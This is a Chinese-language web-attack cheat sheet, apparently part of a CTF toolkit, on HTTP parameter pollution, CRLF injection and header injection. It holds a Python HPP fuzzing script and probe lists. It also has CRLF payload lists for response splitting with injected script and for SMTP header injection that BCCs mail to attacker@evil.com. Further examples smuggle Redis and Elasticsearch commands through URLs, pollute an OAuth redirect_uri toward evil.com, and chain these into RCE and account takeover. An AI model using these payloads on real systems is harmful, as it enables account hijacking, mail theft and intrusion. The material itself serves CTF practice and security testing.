# HPP / CRLF Injection / Header Injection

## 1. HTTP Parameter Pollution (HPP)

### 原理

同参数多次出现时，不同框架取到的值不同：

```
?role=user&role=admin
```

| 框架 | 取值 |
|------|------|
| PHP/Apache | `admin` (最后一个) |
| JSP/Tomcat | `user` (第一个) |
| ASP.NET/IIS | `user,admin` (数组) |
| Flask (werkzeug) | `user` (第一个) |
| Express (qs) | `['user','admin']` (数组) |
| Go (net/http) | `user` (第一个) |

### 利用矩阵

```python
# hpp_attack.py — 覆盖所有 HPP 利用场景
import requests

def hpp_fuzz(target_url: str, param: str, normal: str, malicious: str):
    """
    场景 A: WAF 绕过
    WAF 检查第一个 role=user → 放行
    后端 PHP 取最后一个 role=admin → 越权
    """
    r = requests.get(target_url, params=[
        (param, normal),
        (param, malicious),  # 同参数第二次
    ])
    return r

# 场景 B: 密码重置 — 污染 email 参数
# POST /reset with email=victim@x.com&email=attacker@x.com
# WAF 查第一个 → 合法；后端用最后一个 → attacker 收邮件

# 场景 C: OAuth redirect_uri 污染
# redirect_uri=https://legit.com&redirect_uri=https://evil.com
# 中间件取第一个，OAuth 库取第二个

# 场景 D: SQLi WAF 绕过
# ?id=1&id=1' OR '1'='1
# WAF 看到 id=1 → 安全
# 后端 concat 或取最后一个 → 注入

# 场景 E: 污染 JSON body 多个相同 key
# {"role":"user","role":"admin"}
# Python json.loads → admin (覆盖)
```

### 自动探测器

```python
# 批量探测不同框架的 HPP 行为
HPP_PROBES = [
    # 单参数多次
    "?id=1&id=2",
    "?user=guest&user=admin",
    # URL 编码变体
    "?user=guest%26user=admin",
    "?user=guest&user[]=admin",
    # 分号分隔
    "?user=guest;user=admin",
    # U+0026 全角
    "?user=guest＆user=admin",
]
```

---

## 2. CRLF Injection

```python
# ===== HTTP Response Splitting (CRLF in header value) =====
# 在 Location / Set-Cookie 等 header 中注入 \r\n

CRLF_PAYLOADS = [
    # 基础
    "\r\nSet-Cookie: injected=true",
    "\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n<script>alert(1)</script>",
    # 编码
    "%0d%0aSet-Cookie:%20injected=true",
    "%0D%0ASet-Cookie:%20injected=true",
    "\\r\\nSet-Cookie: injected=true",
    # 绕过 WAF 只过滤 \r\n 但忽略单独的 \r 或 \n
    "\nSet-Cookie: injected=true",
    "\rSet-Cookie: injected=true",
    # Unicode
    "
Set-Cookie: injected=true",
]
```

### CRLF→SSRF 链

```python
# 如果可控 header 值 (如 X-Forwarded-For) 被拼接到后端 HTTP 请求:
# GET /api?url=http://127.0.0.1:%0d%0aHost:%20evil.com%0d%0a
# → SSRF + Host 注入

# CRLF→Cache Poisoning 链
# X-Forwarded-Host: evil.com%0d%0aX-Cache: miss
# → CDN 可能缓存注入的内容
```

### Email 注入 (SMTP CRLF)

```python
# 如果目标有"联系我们"/"反馈"/"邀请" 表单
# 后端用 mail() 发送但没有净化

# CRLF 注入 → 劫持邮件头
PAYLOADS = [
    # BCC 注入 — 密送给自己
    "test\r\nBcc: attacker@evil.com",
    # 修改 Subject
    "test\r\nSubject: <script>alert(1)</script>",
    # 完全劫持邮件正文 (后面的内容变正文)
    "test\r\n\r\nAttacker controlled body",
    # 多收件人
    "test\r\nTo: admin@target.com,\r\nTo: attacker@evil.com",
    # Content-Type 改变 (HTML注入)
    "test\r\nContent-Type: text/html\r\n\r\n<h1>Phish</h1>",
]
```

将上面的 payload 放入当前 case 的最小复现脚本；不要把目标域名、Cookie、邮箱或
请求抓包提交到公共仓库。

---

## 3. Header Injection via URL

```python
# 如果后端把用户 URL 作为 HTTP 请求的目标
# 在 URL 中注入 \r\n 拆分请求:

# Redis via CRLF in URL
"http://127.0.0.1:6379/%0d%0aSET%20key%20value%0d%0a"

# Elasticsearch via CRLF
"http://127.0.0.1:9200/%0d%0aGET%20/_search%20HTTP/1.1%0d%0aHost:127.0.0.1%0d%0a%0d%0a"
```

---

## 4. 攻击链

```
CRLF in URL param → SSRF → Redis/Gopher → RCE
CRLF in redirect → Response Splitting → XSS
CRLF in email → BCC injection → 邮件窃取 → Token 重置劫持
HPP bypass WAF → SQLi/SSTI → RCE
HPP OAuth redirect_uri → 授权码窃取 → Account Takeover
```

## 工具引用

```bash
# 通用 HTTP 探测框架；目标参数由当前 case 提供
python scripts/ctf-website/http_probe.py https://example.test/

# 安装缺失工具
powershell scripts/ctf-website/install_missing_tools.ps1
```
